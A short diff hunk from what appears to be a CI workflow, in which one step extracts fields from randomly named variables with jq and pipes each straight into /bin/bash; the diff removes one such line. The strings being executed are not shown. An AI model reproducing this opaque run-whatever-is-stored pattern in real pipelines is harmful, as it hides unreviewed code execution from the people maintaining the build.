@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$gn8919" | jq -r .n29 | /bin/bash
           printf '%s' "$ytma48" | jq -r .ycpa2 | /bin/bash
           printf '%s' "$mk6" | jq -r .b08960 | /bin/bash
-          echo $xgerq1 | jq -r .z4 | /bin/bash
           printf '%s' "$wo62726" | jq -r .rw3 | /bin/bash
 
       - name: Upload results
